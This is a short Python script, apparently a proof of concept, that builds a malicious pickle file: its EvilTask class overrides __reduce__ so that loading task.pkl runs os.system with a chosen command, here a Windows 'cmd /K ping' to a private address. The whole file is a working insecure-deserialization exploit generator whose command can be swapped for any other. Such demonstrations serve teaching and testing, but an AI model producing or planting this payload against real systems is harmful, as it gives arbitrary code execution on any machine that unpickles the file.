import pickle
import os


class EvilTask:
    def __init__(self, name, action):
        self.name = name
        self.action = action

    def __reduce__(self):
        return (os.system, (self.action,))


def create_evil_task(name, action):
    evil_task = EvilTask(name, action)
    with open('task.pkl', mode='wb') as f:
        pickle.dump(evil_task, file=f)


if __name__ == '__main__':
    create_evil_task('evil task', 'cmd /K ping 192.168.1.106')
